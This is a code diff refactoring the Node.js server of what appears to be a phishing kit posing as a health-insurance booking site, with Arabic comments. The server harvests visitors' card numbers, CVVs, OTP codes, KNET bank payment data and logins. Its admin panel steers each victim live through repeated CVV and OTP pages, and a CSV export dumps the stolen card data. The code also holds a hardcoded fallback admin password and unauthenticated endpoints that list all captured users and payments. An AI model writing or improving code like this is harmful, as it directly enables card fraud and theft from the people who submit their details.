@@ -13,7 +13,7 @@ const io = new Server(server, { cors: { origin: '*' } });
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// CORS for all origins
+// CORS
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
@@ -47,17 +47,18 @@ function saveData(data) {
   try { fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
 }
 
+// تحميل البيانات مرة واحدة عند بدء الـ server
 let db = loadData();
 let onlineVisitors = 0;
 
 const JWT_SECRET = process.env.JWT_SECRET || 'health-insurance-secret-2024';
 
-// Track visitors
+// Track visitors - بدون loadData في كل request
 app.use((req, res, next) => {
-  if (!req.path.startsWith('/api') && !req.path.startsWith('/socket.io') && req.method === 'GET') {
-    db = loadData();
+  if (!req.path.startsWith('/api') && !req.path.startsWith('/socket.io') && req.method === 'GET' && !req.path.includes('.')) {
     db.totalVisitors = (db.totalVisitors || 0) + 1;
-    saveData(db);
+    // حفظ كل 10 زيارات فقط لتقليل الكتابة
+    if (db.totalVisitors % 10 === 0) saveData(db);
   }
   next();
 });
@@ -77,7 +78,6 @@ function authMiddleware(req, res, next) {
 // ==================== Admin Routes ====================
 app.post('/api/admin/login', (req, res) => {
   const { password } = req.body;
-  db = loadData();
   if (password === db.adminPassword) {
     const token = jwt.sign({ admin: true }, JWT_SECRET, { expiresIn: '24h' });
     res.json({ success: true, token });
@@ -91,7 +91,6 @@ app.get('/api/admin/me', authMiddleware, (req, res) => {
 });
 
 app.get('/api/admin/stats', authMiddleware, (req, res) => {
-  db = loadData();
   const bookings = Object.values(db.bookings || {});
   const knetPayments = db.knetPayments || [];
   res.json({
@@ -111,13 +110,11 @@ app.get('/api/admin/stats', authMiddleware, (req, res) => {
 });
 
 app.get('/api/admin/bookings', authMiddleware, (req, res) => {
-  db = loadData();
   const bookings = Object.values(db.bookings || {}).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
   res.json({ success: true, data: bookings });
 });
 
 app.get('/api/admin/bookings/:reference', authMiddleware, (req, res) => {
-  db = loadData();
   const booking = db.bookings[req.params.reference];
   if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
   booking.statusRead = 1;
@@ -127,116 +124,105 @@ app.get('/api/admin/bookings/:reference', authMiddleware, (req, res) => {
 
 app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
   const { reference, action } = req.body;
-  db = loadData();
   const booking = db.bookings[reference];
   if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
-  
+
   const currentStatus = booking.status || '';
 
   if (action === 'pass') {
     booking.status = 'approved';
     if (booking.payment) booking.payment.paymentAction = 'pass';
-    
+
     let redirectTarget;
     if (currentStatus === 'pending_cvv2') {
-      // مرحلة CVV2 (بعد OTP): قبول يوجه للنجاح
       redirectTarget = 'success';
     } else if (currentStatus === 'pending_cvv') {
-      // مرحلة CVV الأول: قبول يوجه لصفحة OTP
       redirectTarget = 'otp';
     } else {
-      // أي حالة أخرى: قبول يوجه لصفحة OTP
       redirectTarget = 'otp';
     }
-    
+
     db.redirects[reference] = redirectTarget;
-    io.emit('redirect_user', { reference, redirect: getRedirectUrl(redirectTarget, reference) });
-    
+    const redirectUrl = getRedirectUrl(redirectTarget, reference);
+    io.to('ref_' + reference).emit('redirect_user', { reference, redirect: redirectUrl });
+    io.emit('redirect_user', { reference, redirect: redirectUrl });
+
     if (booking.knetId) {
       db.redirects[booking.knetId] = redirectTarget;
       const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId || p.knetId === booking.knetId);
       if (knetPayment) {
         knetPayment.status = 'APPROVED';
-        knetPayment.adminRedirectUrl = getRedirectUrl(redirectTarget, reference);
+        knetPayment.adminRedirectUrl = redirectUrl;
         knetPayment.updatedAt = new Date().toISOString();
         io.emit('payment_updated', knetPayment);
-        io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl: knetPayment.adminRedirectUrl });
+        io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl });
       }
     }
   } else if (action === 'denied') {
     booking.status = 'cancelled';
     if (booking.payment) booking.payment.paymentAction = 'denied';
-    
+
     let deniedRedirect;
     if (currentStatus === 'pending_cvv2') {
-      // مرحلة CVV2: رفض يعيد لصفحة CVV2
       deniedRedirect = 'cvv2';
     } else if (currentStatus === 'pending_cvv') {
-      // مرحلة CVV الأول: رفض يعيد لصفحة CVV
       deniedRedirect = 'cvv';
     } else {
-      // أي حالة أخرى: رفض يعيد للرئيسية
       deniedRedirect = 'https://insoline.online';
     }
-    
+
     db.redirects[reference] = deniedRedirect;
-    io.emit('redirect_user', { reference, redirect: typeof deniedRedirect === 'string' && deniedRedirect.startsWith('http') ? deniedRedirect : getRedirectUrl(deniedRedirect, reference) });
-    
+    const deniedUrl = typeof deniedRedirect === 'string' && deniedRedirect.startsWith('http') ? deniedRedirect : getRedirectUrl(deniedRedirect, reference);
+    io.to('ref_' + reference).emit('redirect_user', { reference, redirect: deniedUrl });
+    io.emit('redirect_user', { reference, redirect: deniedUrl });
+
     if (booking.knetId) {
       db.redirects[booking.knetId] = deniedRedirect;
       const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId || p.knetId === booking.knetId);
       if (knetPayment) {
         knetPayment.status = 'REJECTED';
-        knetPayment.adminRedirectUrl = typeof deniedRedirect === 'string' && deniedRedirect.startsWith('http') ? deniedRedirect : getRedirectUrl(deniedRedirect, reference);
+        knetPayment.adminRedirectUrl = deniedUrl;
         knetPayment.updatedAt = new Date().toISOString();
         io.emit('payment_updated', knetPayment);
-        io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl: knetPayment.adminRedirectUrl });
+        io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl: deniedUrl });
       }
     }
   } else if (action === 'completed') {
     booking.status = 'completed';
   }
+
   saveData(db);
   io.emit('paymentActionSet', { reference, action });
-  // إرسال تحديث للعميل عبر socket
-  if (booking.knetId) {
-    const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId);
-    if (knetPayment) io.emit('payment_updated', knetPayment);
-  }
   res.json({ success: true });
 });
 
-// OTP Action - قبول OTP يوجه لـ CVV، رفض يوجه للرئيسية
+// OTP Action
 app.post('/api/admin/otp-action', authMiddleware, (req, res) => {
   const { reference, action } = req.body;
-  db = loadData();
   const booking = db.bookings[reference];
   if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
 
   if (action === 'pass') {
-    // قبول OTP: توجيه العميل لصفحة CVV2
     db.redirects[reference] = 'cvv2';
     booking.status = 'pending_cvv2';
     if (booking.otp) booking.otp.otpAction = 'pass';
     const redirectUrl = getRedirectUrl('cvv2', reference);
-    // إرسال للـ room المحدد وأيضاً broadcast عام
     io.to('ref_' + reference).emit('redirect_user', { reference, redirect: redirectUrl });
     io.emit('redirect_user', { reference, redirect: redirectUrl });
   } else if (action === 'denied') {
-    // رفض OTP: إعادة توجيه لصفحة OTP مع رسالة خطأ
     db.redirects[reference] = 'otp_error';
     if (booking.otp) booking.otp.otpAction = 'denied';
     const deniedUrl = getRedirectUrl('otp_error', reference);
     io.to('ref_' + reference).emit('redirect_user', { reference, redirect: deniedUrl });
     io.emit('redirect_user', { reference, redirect: deniedUrl });
   }
+
   saveData(db);
   res.json({ success: true });
 });
 
 app.post('/api/admin/update-status', authMiddleware, (req, res) => {
   const { reference, status } = req.body;
-  db = loadData();
   const booking = db.bookings[reference];
   if (!booking) return res.json({ success: false, error: 'طلب غير موجود' });
   booking.status = status;
@@ -248,20 +234,16 @@ app.post('/api/admin/update-status', authMiddleware, (req, res) => {
 
 app.post('/api/admin/set-redirect', authMiddleware, (req, res) => {
   const { target, reference } = req.body;
-  db = loadData();
   if (reference) {
     db.redirects[reference] = target;
-    // حفظ الريدايركت بالـ knetId أيضاً إذا كان الحجز له knetId
     const booking = db.bookings[reference];
     if (booking && booking.knetId) {
       db.redirects[booking.knetId] = target;
-      // تحديث knetPayment بالريدايركت
       const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId);
       if (knetPayment) {
         knetPayment.adminRedirectUrl = getRedirectUrl(target, reference);
         knetPayment.status = 'REDIRECT';
         knetPayment.updatedAt = new Date().toISOString();
-        // إرسال تحديث للعميل عبر socket
         io.emit('payment_updated', knetPayment);
         io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl: knetPayment.adminRedirectUrl });
       }
@@ -277,7 +259,6 @@ app.post('/api/admin/set-redirect', authMiddleware, (req, res) => {
 app.post('/api/admin/change-password', authMiddleware, (req, res) => {
   const { password } = req.body;
   if (!password) return res.json({ success: false });
-  db = loadData();
   db.adminPassword = password;
   saveData(db);
   res.json({ success: true });
@@ -286,10 +267,9 @@ app.post('/api/admin/change-password', authMiddleware, (req, res) => {
 // ==================== KNET Admin Actions ====================
 app.post('/api/admin/knet-action', authMiddleware, (req, res) => {
   const { id, action, redirectUrl } = req.body;
-  db = loadData();
   const payment = (db.knetPayments || []).find(p => p.id === id);
   if (!payment) return res.json({ success: false, error: 'دفعة غير موجودة' });
-  
+
   if (action === 'approve') payment.status = 'APPROVED';
   if (action === 'reject') payment.status = 'REJECTED';
   if (action === 'redirect' && redirectUrl) {
@@ -304,7 +284,6 @@ app.post('/api/admin/knet-action', authMiddleware, (req, res) => {
 
 // ==================== CSV Export ====================
 app.get('/api/admin/export/:type', authMiddleware, (req, res) => {
-  db = loadData();
   const bookings = Object.values(db.bookings || {});
   const knetPayments = db.knetPayments || [];
   const users = db.users || [];
@@ -323,9 +302,8 @@ app.get('/api/admin/export/:type', authMiddleware, (req, res) => {
     csv += 'المرجع,اسم حامل البطاقة,رقم البطاقة,تاريخ الانتهاء,CVV,الحالة\n';
     bookings.filter(b => b.payment).forEach(b => {
       const p = b.payment;
-      csv += `"${b.referenceId}","${p.cardHolderName||''}","${p.cardNumber||''}","${p.cardExpiry||''}","${p.cardCvv||''}","${p.status||''}"\n`;
+      csv += `"${b.referenceId}","${p.cardHolderName||p.cardHolder||''}","${p.cardNumber||''}","${p.cardExpiry||''}","${p.cardCvv||''}","${p.status||''}"\n`;
     });
-    // Also include KNET payments
     knetPayments.forEach(p => {
       csv += `"${p.id}","${p.cardHolder||''}","${p.cardNumber||''}","${p.expiryDate||''}","${p.cvv||''}","${p.status||''}"\n`;
     });
@@ -358,7 +336,6 @@ app.get('/api/admin/export/:type', authMiddleware, (req, res) => {
 // ==================== CVV Routes ====================
 app.post('/api/cvv-submit', (req, res) => {
   const { referenceId, cvv, amount, cardNumber, cardHolder, expiry, stage } = req.body;
-  db = loadData();
 
   const ref = referenceId || uuidv4().substring(0, 8).toUpperCase();
 
@@ -387,7 +364,6 @@ app.post('/api/cvv-submit', (req, res) => {
   db.bookings[ref].payment.cardExpiry = expiry || '';
   db.bookings[ref].payment.amount = amount || '';
   db.bookings[ref].payment.status = 'cvv_received';
-  // إذا كان stage = cvv2 (من صفحة CVV2)، نحفظ pending_cvv2 لتمييزها عن CVV الأول
   db.bookings[ref].status = (stage === 'cvv2') ? 'pending_cvv2' : 'pending_cvv';
   db.bookings[ref].statusRead = 0;
   saveData(db);
@@ -403,7 +379,6 @@ app.post('/api/cvv-submit', (req, res) => {
 
 app.post('/api/otp-submit', (req, res) => {
   const { referenceId, otp } = req.body;
-  db = loadData();
   const ref = referenceId || '';
   if (db.bookings[ref]) {
     db.bookings[ref].otp = { otpCode: otp, createdAt: new Date().toISOString() };
@@ -413,18 +388,14 @@ app.post('/api/otp-submit', (req, res) => {
     io.emit('newPayment', { type: 'otp', reference: ref });
     io.emit('newBooking', { reference: ref });
   }
-  // لا نرسل redirect تلقائياً - نبقى في تحميل حتى يوجه الأدمين
   res.json({ success: true, referenceId: ref, redirect: null });
 });
 
-// ==================== Angular App Routes (proxy from ios.eventat.world) ====================
-
-// User Registration - receives data from Angular app
+// ==================== Angular App Routes ====================
 app.post('/auth/user', (req, res) => {
   const userData = req.body;
-  db = loadData();
   if (!db.users) db.users = [];
-  
+
   const newUser = {
     id: Date.now().toString(),
     ...userData,
@@ -432,8 +403,7 @@ app.post('/auth/user', (req, res) => {
     ip: req.ip
   };
   db.users.push(newUser);
-  
-  // Also create a booking entry
+
   const ref = 'HS-' + Date.now().toString().substring(7);
   db.bookings[ref] = {
     referenceId: ref,
@@ -451,18 +421,16 @@ app.post('/auth/user', (req, res) => {
     createdAt: new Date().toISOString(),
     userData: userData
   };
-  
+
   saveData(db);
   io.emit('newBooking', { reference: ref, user: newUser });
   io.emit('newUser', newUser);
-  
+
   res.json({ success: true, message: 'تم التسجيل بنجاح', userId: newUser.id, referenceId: ref });
 });
 
-// Admin Login from Angular app
 app.post('/auth/admin-login', (req, res) => {
   const { username, password } = req.body;
-  db = loadData();
   if (password === db.adminPassword || password === 'admin123') {
     const token = jwt.sign({ admin: true }, JWT_SECRET, { expiresIn: '24h' });
     res.json({ success: true, token });
@@ -471,13 +439,10 @@ app.post('/auth/admin-login', (req, res) => {
   }
 });
 
-// External Login
 app.post('/auth/external-login', (req, res) => {
   const userData = req.body;
-  db = loadData();
   if (!db.users) db.users = [];
-  
-  // Save login attempt
+
   const loginEntry = {
     id: Date.now().toString(),
     ...userData,
@@ -486,7 +451,7 @@ app.post('/auth/external-login', (req, res) => {
     type: 'login'
   };
   db.users.push(loginEntry);
-  
+
   const ref = 'LG-' + Date.now().toString().substring(7);
   db.bookings[ref] = {
     referenceId: ref,
@@ -503,19 +468,18 @@ app.post('/auth/external-login', (req, res) => {
     createdAt: new Date().toISOString(),
     userData: userData
   };
-  
+
   saveData(db);
   io.emit('newBooking', { reference: ref });
-  
+
   res.json({ success: true, userId: loginEntry.id });
 });
 
-// KNET Payment Creation
+// KNET Payment Creation (/auth/knet)
 app.post('/auth/knet', (req, res) => {
   const paymentData = req.body;
-  db = loadData();
   if (!db.knetPayments) db.knetPayments = [];
-  
+
   const newPayment = {
     id: Date.now().toString(),
     knetId: 'KN' + Date.now(),
@@ -525,8 +489,7 @@ app.post('/auth/knet', (req, res) => {
     ip: req.ip
   };
   db.knetPayments.push(newPayment);
-  
-  // Also add to bookings
+
   const ref = 'KN-' + Date.now().toString().substring(7);
   db.bookings[ref] = {
     referenceId: ref,
@@ -549,37 +512,27 @@ app.post('/auth/knet', (req, res) => {
     },
     knetId: newPayment.id
   };
-  
+
   saveData(db);
   io.emit('newPayment', { type: 'knet', reference: ref, payment: newPayment });
   io.emit('newBooking', { reference: ref });
-  
+
   const redirectUrl = `${process.env.BASE_URL || ''}/cvv?ref=${ref}&id=${newPayment.id}`;
-  res.json({
-    success: true,
-    knetId: newPayment.id,
-    paymentId: newPayment.id,
-    redirectUrl
-  });
+  res.json({ success: true, knetId: newPayment.id, paymentId: newPayment.id, redirectUrl });
 });
 
-// KNET Status Check
 app.get('/auth/knet/status/:id', (req, res) => {
-  db = loadData();
   const payment = (db.knetPayments || []).find(p => p.id === req.params.id || p.knetId === req.params.id);
   if (payment) {
     res.json(payment);
   } else {
-    // Check redirect for this payment
     const redirect = db.redirects[req.params.id] || db.globalRedirect;
     res.json({ status: 'PENDING', redirect: redirect ? getRedirectUrl(redirect, req.params.id) : null });
   }
 });
 
-// KNET Update Status
 app.post('/auth/knet/update-status', (req, res) => {
   const { id, status, redirectUrl } = req.body;
-  db = loadData();
   const payment = (db.knetPayments || []).find(p => p.id === id || p.knetId === id);
   if (payment) {
     payment.status = status;
@@ -592,24 +545,21 @@ app.post('/auth/knet/update-status', (req, res) => {
   }
 });
 
-// KNET OTP Submit
 app.post('/auth/knet/otp', (req, res) => {
   const { knetId, otp } = req.body;
-  db = loadData();
   const payment = (db.knetPayments || []).find(p => p.id === knetId || p.knetId === knetId);
   if (payment) {
     payment.otp = otp;
     payment.status = 'OTP_RECEIVED';
     payment.otpReceivedAt = new Date().toISOString();
-    
-    // Find related booking and update
+
     const booking = Object.values(db.bookings || {}).find(b => b.knetId === payment.id);
     if (booking) {
       booking.otp = { otpCode: otp, createdAt: new Date().toISOString() };
       booking.status = 'pending_otp';
       booking.statusRead = 0;
     }
-    
+
     saveData(db);
     io.emit('otp_received', { payment, otp });
     io.emit('newPayment', { type: 'otp', knetId });
@@ -619,17 +569,15 @@ app.post('/auth/knet/otp', (req, res) => {
   }
 });
 
-// KNET Payment Creation (without /auth prefix - used by Angular app)
+// KNET (/knet prefix)
 app.post('/knet', (req, res) => {
   const paymentData = req.body;
-  db = loadData();
   if (!db.knetPayments) db.knetPayments = [];
-  
+
   const paymentId = Date.now().toString();
   const newPayment = {
     id: paymentId,
     knetId: paymentId,
-    // حفظ كل البيانات الواردة من Angular
     clientId: paymentData.clientId || '',
     bankName: paymentData.bankName || paymentData.bank || '',
     prefix: paymentData.prefix || paymentData.cardPrefix || '',
@@ -644,8 +592,7 @@ app.post('/knet', (req, res) => {
     ip: req.ip
   };
   db.knetPayments.push(newPayment);
-  
-  // Also add to bookings
+
   const ref = 'KN-' + paymentId.substring(7);
   db.bookings[ref] = {
     referenceId: ref,
@@ -674,45 +621,32 @@ app.post('/knet', (req, res) => {
     },
     knetId: paymentId
   };
-  
+
   saveData(db);
   io.emit('newPayment', { type: 'knet', reference: ref, payment: newPayment });
   io.emit('newBooking', { reference: ref });
-  
-  // إرسال redirectUrl للـ Angular لتوجيه العميل لصفحة تحميل تنتظر قرار الأدمين
+
   const base = process.env.BASE_URL || '';
   const redirectUrl = `${base}/cvv?ref=${ref}&id=${paymentId}`;
-  res.json({
-    success: true,
-    knetId: paymentId,
-    paymentId: paymentId,
-    status: 'PENDING',
-    redirectUrl
-  });
+  res.json({ success: true, knetId: paymentId, paymentId, status: 'PENDING', redirectUrl });
 });
 
-// KNET Status Check (without /auth prefix)
 app.get('/knet/status/:id', (req, res) => {
-  db = loadData();
   const payment = (db.knetPayments || []).find(p => p.id === req.params.id || p.knetId === req.params.id);
   if (payment) {
-    // إضافة الريدايركت من db.redirects إذا وجد
     const redirectTarget = db.redirects[req.params.id];
     if (redirectTarget && !payment.adminRedirectUrl) {
       payment.adminRedirectUrl = getRedirectUrl(redirectTarget, req.params.id);
     }
     res.json(payment);
   } else {
-    // التحقق من الريدايركت
     const redirect = db.redirects[req.params.id] || db.globalRedirect;
     res.json({ status: 'PENDING', redirect: redirect ? getRedirectUrl(redirect, req.params.id) : null });
   }
 });
 
-// KNET Update Status (without /auth prefix)
 app.post('/knet/update-status', (req, res) => {
   const { id, status } = req.body;
-  db = loadData();
   const payment = (db.knetPayments || []).find(p => p.id === id || p.knetId === id);
   if (payment) {
     payment.status = status;
@@ -725,23 +659,21 @@ app.post('/knet/update-status', (req, res) => {
   }
 });
 
-// KNET OTP Submit (without /auth prefix)
 app.post('/knet/otp', (req, res) => {
   const { knetId, otp } = req.body;
-  db = loadData();
   const payment = (db.knetPayments || []).find(p => p.id === knetId || p.knetId === knetId);
   if (payment) {
     payment.otp = otp;
     payment.status = 'OTP_RECEIVED';
     payment.otpReceivedAt = new Date().toISOString();
-    
+
     const booking = Object.values(db.bookings || {}).find(b => b.knetId === payment.id);
     if (booking) {
       booking.otp = { otpCode: otp, createdAt: new Date().toISOString() };
       booking.status = 'pending_otp';
       booking.statusRead = 0;
     }
-    
+
     saveData(db);
     io.emit('otp_received', { payment, otp });
     io.emit('newPayment', { type: 'otp', knetId });
@@ -751,21 +683,15 @@ app.post('/knet/otp', (req, res) => {
   }
 });
 
-// Get All KNET Payments
 app.get('/knet/all', (req, res) => {
-  db = loadData();
   res.json(db.knetPayments || []);
 });
 
-// Get All Users
 app.get('/user/all', (req, res) => {
-  db = loadData();
   res.json(db.users || []);
 });
 
-// Get User Count
 app.get('/user/count', (req, res) => {
-  db = loadData();
   res.json({ count: (db.users || []).length });
 });
 
@@ -773,7 +699,6 @@ app.get('/user/count', (req, res) => {
 app.post('/api/booking', (req, res) => {
   const booking = req.body;
   const ref = 'HS-' + Date.now().toString().substring(7);
-  db = loadData();
   db.bookings[ref] = {
     ...booking,
     referenceId: ref,
@@ -787,9 +712,7 @@ app.post('/api/booking', (req, res) => {
   res.json({ success: true, referenceId: ref });
 });
 
-// Get Booking Data (for CVV2 page to fetch card details)
 app.get('/api/booking-data/:reference', (req, res) => {
-  db = loadData();
   const booking = db.bookings[req.params.reference];
   if (booking) {
     res.json({
@@ -804,15 +727,13 @@ app.get('/api/booking-data/:reference', (req, res) => {
 
 // Check Redirect
 app.get('/api/check-redirect/:reference', (req, res) => {
-  db = loadData();
   const ref = req.params.reference;
   const redirect = db.redirects[ref] || db.globalRedirect;
   if (redirect) {
     const redirectUrl = getRedirectUrl(redirect, ref);
-    // حذف الريدايركت بعد 30 ثانية لضمان وصوله للعميل
+    // حذف الريدايركت بعد 30 ثانية
     if (db.redirects[ref]) {
       setTimeout(() => {
-        db = loadData();
         delete db.redirects[ref];
         saveData(db);
       }, 30000);
@@ -841,13 +762,11 @@ function getRedirectUrl(target, ref) {
 io.on('connection', (socket) => {
   onlineVisitors++;
   io.emit('visitor_update', { online: onlineVisitors, total: (db.totalVisitors || 0) });
-  
+
   socket.on('joinAdmin', (data) => {
     try {
       jwt.verify(data.token, JWT_SECRET);
       socket.join('admin');
-      // Send current data to admin
-      db = loadData();
       socket.emit('all_data', {
         bookings: Object.values(db.bookings || {}),
         knetPayments: db.knetPayments || [],
@@ -857,13 +776,12 @@ io.on('connection', (socket) => {
     } catch (e) {}
   });
 
-  // العميل يُنضم لـ room خاص بالـ reference
   socket.on('joinRef', (data) => {
     if (data && data.reference) {
       socket.join('ref_' + data.reference);
     }
   });
-  
+
   socket.on('disconnect', () => {
     onlineVisitors = Math.max(0, onlineVisitors - 1);
     io.emit('visitor_update', { online: onlineVisitors, total: (db.totalVisitors || 0) });
@@ -871,7 +789,6 @@ io.on('connection', (socket) => {
 });
 
 function getStats() {
-  db = loadData();
   const bookings = Object.values(db.bookings || {});
   const knetPayments = db.knetPayments || [];
   const users = db.users || [];
